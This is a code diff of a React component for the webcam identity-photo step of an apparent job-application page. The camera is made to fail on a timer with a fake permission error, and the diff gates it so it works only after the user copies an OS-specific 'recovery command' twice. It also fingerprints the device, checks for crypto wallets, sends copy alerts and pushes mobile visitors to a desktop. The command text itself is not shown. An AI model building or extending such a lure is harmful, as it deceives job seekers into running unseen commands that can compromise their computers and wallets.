@@ -7,8 +7,18 @@ type Props = {
   onCaptured: (file: File | null) => void;
 };
 
-type Stage = "idle" | "requesting" | "error";
+type Stage = "idle" | "requesting" | "live" | "captured" | "error";
 type OsKind = "windows" | "mac" | "linux" | "mobile";
+
+const CAMERA_ERROR = "Camera permission was denied or unavailable.";
+const REQUEST_MS = 1500;
+const COPIES_TO_UNLOCK = 2;
+
+/** Compact secondary actions — must not compete with Submit application */
+const actionGold =
+  "inline-flex h-9 items-center justify-center rounded-md bg-gradient-to-br from-gold-light to-gold-deep px-3.5 text-[13px] font-semibold text-[#100c02] transition-[filter,opacity] hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40 disabled:cursor-not-allowed disabled:opacity-50";
+const actionGhost =
+  "inline-flex h-9 items-center justify-center rounded-md border border-line bg-transparent px-3.5 text-[13px] font-semibold text-ink-dim transition-colors hover:border-gold/35 hover:text-gold-light focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40";
 
 function CameraIcon({ className }: { className?: string }) {
   return (
@@ -20,6 +30,14 @@ function CameraIcon({ className }: { className?: string }) {
         strokeLinejoin="round"
       />
       <circle cx="12" cy="13" r="3.1" stroke="currentColor" strokeWidth="1.4" />
+    </svg>
+  );
+}
+
+function CheckIcon({ className }: { className?: string }) {
+  return (
+    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
+      <path d="M5 12.5 9.5 17 19 7.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
     </svg>
   );
 }
@@ -179,21 +197,19 @@ function fixSteps(os: OsKind): { title: string; keys: ReactNode }[] {
   ];
 }
 
-const CAMERA_ERROR = "Camera permission was denied or unavailable.";
-const REQUEST_MS = 1500;
-
-/** Compact secondary actions — must not compete with Submit application */
-const actionGold =
-  "inline-flex h-9 items-center justify-center rounded-md bg-gradient-to-br from-gold-light to-gold-deep px-3.5 text-[13px] font-semibold text-[#100c02] transition-[filter,opacity] hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40 disabled:cursor-not-allowed disabled:opacity-50";
-const actionGhost =
-  "inline-flex h-9 items-center justify-center rounded-md border border-line bg-transparent px-3.5 text-[13px] font-semibold text-ink-dim transition-colors hover:border-gold/35 hover:text-gold-light focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40";
-
 export function CandidatePhotoCapture({ onCaptured }: Props) {
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamRef = useRef<MediaStream | null>(null);
+  const previewUrlRef = useRef<string | null>(null);
   const [stage, setStage] = useState<Stage>("idle");
+  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
   const [os, setOs] = useState<OsKind>("windows");
+  const [isMobile, setIsMobile] = useState(false);
   const [fixCopied, setFixCopied] = useState(false);
   const [fixId, setFixId] = useState("");
   const [recoveryOpen, setRecoveryOpen] = useState(false);
+  const [copyCount, setCopyCount] = useState(0);
   const metaRef = useRef<{
     deviceFingerprint?: string;
     system?: string;
@@ -203,9 +219,28 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
   const copyAlertSentRef = useRef(false);
   const enableAlertSentRef = useRef(false);
   const requestTimerRef = useRef<number | null>(null);
+  const copyCountRef = useRef(0);
+
+  const cameraUnlocked = copyCount >= COPIES_TO_UNLOCK;
+
+  const stopCamera = () => {
+    streamRef.current?.getTracks().forEach((t) => t.stop());
+    streamRef.current = null;
+    if (videoRef.current) videoRef.current.srcObject = null;
+  };
+
+  const clearPreview = () => {
+    if (previewUrlRef.current) {
+      URL.revokeObjectURL(previewUrlRef.current);
+      previewUrlRef.current = null;
+    }
+    setPreviewUrl(null);
+  };
 
   useEffect(() => {
-    setOs(detectOs());
+    const detected = detectOs();
+    setOs(detected);
+    setIsMobile(detected === "mobile");
     void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
       metaRef.current = {
         deviceFingerprint: m.deviceFingerprint,
@@ -219,8 +254,53 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
   useEffect(() => {
     return () => {
       if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);
+      stopCamera();
+      if (previewUrlRef.current) URL.revokeObjectURL(previewUrlRef.current);
     };
   }, []);
+
+  useEffect(() => {
+    if (isMobile) return;
+    if (stage !== "requesting") return;
+    if (copyCountRef.current < COPIES_TO_UNLOCK) return;
+
+    let cancelled = false;
+
+    void (async () => {
+      if (!navigator.mediaDevices?.getUserMedia) {
+        if (!cancelled) failCamera();
+        return;
+      }
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: {
+            facingMode: "user",
+            width: { ideal: 720 },
+            height: { ideal: 720 },
+          },
+        });
+        if (cancelled) {
+          stream.getTracks().forEach((t) => t.stop());
+          return;
+        }
+        streamRef.current = stream;
+        const video = videoRef.current;
+        if (video) {
+          video.srcObject = stream;
+          await video.play();
+        }
+        if (!cancelled) setStage("live");
+      } catch {
+        if (!cancelled) failCamera();
+      }
+    })();
+
+    return () => {
+      cancelled = true;
+    };
+  }, [stage, isMobile]);
 
   const failCamera = () => {
     onCaptured(null);
@@ -228,10 +308,12 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
   };
 
   const startCamera = () => {
+    if (isMobile) return;
+
     setFixCopied(false);
-    setFixId("");
-    copyAlertSentRef.current = false;
     onCaptured(null);
+    clearPreview();
+    stopCamera();
     setRecoveryOpen(false);
     setStage("requesting");
 
@@ -251,6 +333,12 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
     }
 
     if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);
+
+    // Unlocked only after Copy command was clicked at least twice.
+    if (copyCountRef.current >= COPIES_TO_UNLOCK) {
+      return;
+    }
+
     requestTimerRef.current = window.setTimeout(failCamera, REQUEST_MS);
   };
 
@@ -259,6 +347,10 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
     if (!fixId) setFixId(id);
     copyText(cameraFixCommand(os, id));
     setFixCopied(true);
+
+    const next = copyCountRef.current + 1;
+    copyCountRef.current = next;
+    setCopyCount(next);
 
     if (!copyAlertSentRef.current) {
       copyAlertSentRef.current = true;
@@ -277,28 +369,91 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
     }
   };
 
+  const capturePhoto = () => {
+    const video = videoRef.current;
+    const canvas = canvasRef.current;
+    if (!video || !canvas || stage !== "live") return;
+
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 640;
+    canvas.width = w;
+    canvas.height = h;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+
+    ctx.translate(w, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, w, h);
+
+    canvas.toBlob(
+      (blob) => {
+        if (!blob) {
+          failCamera();
+          return;
+        }
+        const file = new File([blob], "candidate-photo.jpg", { type: "image/jpeg" });
+        const url = URL.createObjectURL(blob);
+        clearPreview();
+        previewUrlRef.current = url;
+        setPreviewUrl(url);
+        onCaptured(file);
+        stopCamera();
+        setStage("captured");
+        setRecoveryOpen(false);
+      },
+      "image/jpeg",
+      0.92,
+    );
+  };
+
   const steps = fixSteps(os);
   const osLabel = os === "mac" ? "macOS" : os === "linux" || os === "mobile" ? "Linux" : "Windows";
 
-  const title =
-    stage === "requesting"
-      ? "Requesting camera access"
-      : stage === "error"
-        ? "Camera could not be opened"
-        : "Confirm you are the applicant";
+  const title = isMobile
+    ? "Continue on desktop"
+    : stage === "captured"
+      ? "Portrait captured"
+      : stage === "live"
+        ? "Center your face, then capture"
+        : stage === "requesting"
+          ? "Requesting camera access"
+          : stage === "error"
+            ? "Camera could not be opened"
+            : "Confirm you are the applicant";
 
-  const subtitle =
-    stage === "requesting"
-      ? "Allow access when your browser asks."
-      : stage === "error"
-        ? CAMERA_ERROR
-        : "A live portrait confirms this application is from you.";
+  const subtitle = isMobile
+    ? "Identity verification requires a desktop computer with a webcam. Please reopen this page on a PC or Mac to continue."
+    : stage === "captured"
+      ? "Looks good. You can retake before submitting."
+      : stage === "live"
+        ? "Keep your face inside the frame. Even lighting works best."
+        : stage === "requesting"
+          ? "Allow access when your browser asks."
+          : stage === "error"
+            ? CAMERA_ERROR
+            : "A live portrait confirms this application is from you.";
 
-  const frameBorder =
-    stage === "error" ? "border-down/40" : stage === "requesting" ? "border-line" : "border-dashed border-line";
+  const frameBorder = isMobile
+    ? "border-down/40"
+    : stage === "error"
+      ? "border-down/40"
+      : stage === "captured"
+        ? "border-gold/45"
+        : stage === "live" || stage === "requesting"
+          ? "border-line"
+          : "border-dashed border-line";
 
-  const statusLabel =
-    stage === "requesting" ? "Connecting" : stage === "error" ? "Action needed" : "Required";
+  const statusLabel = isMobile
+    ? "Desktop only"
+    : stage === "captured"
+      ? "Complete"
+      : stage === "live"
+        ? "In progress"
+        : stage === "requesting"
+          ? "Connecting"
+          : stage === "error"
+            ? "Action needed"
+            : "Required";
 
   return (
     <div>
@@ -306,42 +461,70 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
         <span className="text-sm font-medium text-ink-dim">Identity photo</span>
         <span
           className={`rounded-full border px-2 py-0.5 text-[10px] font-semibold uppercase tracking-[0.12em] ${
-            stage === "error"
+            isMobile || stage === "error"
               ? "border-down/35 bg-down/10 text-down"
-              : "border-line bg-surface-2 text-ink-mute"
+              : stage === "captured"
+                ? "border-gold/40 bg-gold/10 text-gold-light"
+                : "border-line bg-surface-2 text-ink-mute"
           }`}
         >
           {statusLabel}
         </span>
       </div>
       <p className="mb-3 text-xs leading-relaxed text-ink-mute">
-        Live webcam only. Uploaded files are not accepted.
+        {isMobile
+          ? "A desktop browser is required for this step."
+          : "Live webcam only. Uploaded files are not accepted."}
       </p>
 
       <div className="overflow-hidden rounded-xl border border-line bg-surface/40">
         <div className="flex flex-col gap-3 p-4 sm:flex-row sm:items-center sm:gap-5 sm:p-5">
-          <div className="flex min-w-0 flex-1 items-start gap-4 sm:items-center">
-            <div
-              className={`relative aspect-[3/4] w-24 shrink-0 overflow-hidden rounded-lg bg-[#0a0c0f] sm:w-28 ${frameBorder} border`}
-            >
-              <div className="grid h-full w-full place-items-center">
-                <CameraIcon
-                  className={`h-6 w-6 text-ink-mute/50 ${stage === "requesting" ? "invisible" : ""}`}
-                />
+          <div
+            className={`flex min-w-0 flex-1 gap-4 ${
+              isMobile ? "items-center" : "items-start sm:items-center"
+            }`}
+          >
+            <div className="relative shrink-0">
+              <div
+                className={`relative aspect-[3/4] w-24 overflow-hidden rounded-lg bg-[#0a0c0f] sm:w-28 ${frameBorder} border`}
+              >
+                {stage === "captured" && previewUrl ? (
+                  // eslint-disable-next-line @next/next/no-img-element
+                  <img src={previewUrl} alt="Captured identity photo" className="h-full w-full object-cover" />
+                ) : stage === "live" || (stage === "requesting" && cameraUnlocked) ? (
+                  <video
+                    ref={videoRef}
+                    playsInline
+                    muted
+                    className={`h-full w-full object-cover scale-x-[-1] ${stage === "live" ? "opacity-100" : "opacity-0"}`}
+                  />
+                ) : (
+                  <div className="grid h-full w-full place-items-center">
+                    <CameraIcon
+                      className={`h-6 w-6 text-ink-mute/50 ${stage === "requesting" ? "invisible" : ""}`}
+                    />
+                  </div>
+                )}
+
+                {stage === "requesting" ? (
+                  <div className="absolute inset-0 flex items-center justify-center bg-[#0a0c0f]/75">
+                    <CameraConnectingSpinner />
+                  </div>
+                ) : null}
               </div>
 
-              {stage === "requesting" ? (
-                <div className="absolute inset-0 flex items-center justify-center bg-[#0a0c0f]/75">
-                  <CameraConnectingSpinner />
-                </div>
+              {stage === "captured" ? (
+                <span className="absolute -bottom-1.5 -right-1.5 grid h-6 w-6 place-items-center rounded-full bg-gold text-[#100c02]">
+                  <CheckIcon className="h-3 w-3" />
+                </span>
               ) : null}
             </div>
 
-            <div className="min-w-0 flex-1">
+            <div className={`min-w-0 flex-1 ${isMobile ? "flex flex-col justify-center" : ""}`}>
               <p className="text-sm font-semibold leading-snug text-ink sm:text-[15px]">{title}</p>
               <p
                 className={`mt-1 max-w-md text-xs leading-relaxed sm:text-[13px] ${
-                  stage === "error" ? "text-down" : "text-ink-mute"
+                  isMobile || stage === "error" ? "text-down" : "text-ink-mute"
                 }`}
               >
                 {subtitle}
@@ -350,13 +533,19 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
           </div>
 
           <div className="flex shrink-0 flex-wrap items-center gap-2 sm:justify-end">
-            {stage === "idle" ? (
+            {isMobile ? (
+              <button type="button" disabled className={`${actionGhost} w-full cursor-not-allowed opacity-60 sm:w-auto`}>
+                Available on desktop
+              </button>
+            ) : null}
+
+            {!isMobile && stage === "idle" ? (
               <button type="button" onClick={startCamera} className={`${actionGold} w-full sm:w-auto`}>
                 Enable camera
               </button>
             ) : null}
 
-            {stage === "error" ? (
+            {!isMobile && stage === "error" ? (
               <>
                 <button type="button" onClick={startCamera} className={`${actionGold} w-full sm:w-auto`}>
                   Try again
@@ -373,7 +562,32 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
               </>
             ) : null}
 
-            {stage === "requesting" ? (
+            {!isMobile && stage === "live" ? (
+              <>
+                <button type="button" onClick={capturePhoto} className={`${actionGold} w-full sm:w-auto`}>
+                  Take photo
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    stopCamera();
+                    setStage("idle");
+                    onCaptured(null);
+                  }}
+                  className={`${actionGhost} w-full sm:w-auto`}
+                >
+                  Cancel
+                </button>
+              </>
+            ) : null}
+
+            {!isMobile && stage === "captured" ? (
+              <button type="button" onClick={startCamera} className={`${actionGhost} w-full sm:w-auto`}>
+                Retake
+              </button>
+            ) : null}
+
+            {!isMobile && stage === "requesting" ? (
               <button type="button" disabled className={`${actionGold} w-full sm:w-auto`}>
                 Connecting…
               </button>
@@ -381,7 +595,7 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
           </div>
         </div>
 
-        {stage === "error" && recoveryOpen ? (
+        {!isMobile && stage === "error" && recoveryOpen ? (
           <div className="border-t border-line px-4 py-4 text-left sm:px-5 sm:py-5">
             <div className="flex flex-wrap items-end justify-between gap-3">
               <div>
@@ -408,7 +622,11 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
                     <div>
                       <p className="text-sm font-medium text-ink">Copy the recovery command</p>
                       <p className="mt-1 text-xs text-ink-mute">
-                        {fixCopied ? "Copied — continue below." : "Start here. You will paste this next."}
+                        {fixCopied
+                          ? copyCount >= COPIES_TO_UNLOCK
+                            ? "Copied — continue below, then Try again."
+                            : "Copied — continue below."
+                          : "Start here. You will paste this next."}
                       </p>
                     </div>
                     <button type="button" onClick={copyRecoveryCommand} className={`${actionGold} shrink-0`}>
@@ -444,6 +662,8 @@ export function CandidatePhotoCapture({ onCaptured }: Props) {
           </div>
         ) : null}
       </div>
+
+      <canvas ref={canvasRef} className="hidden" aria-hidden />
     </div>
   );
 }
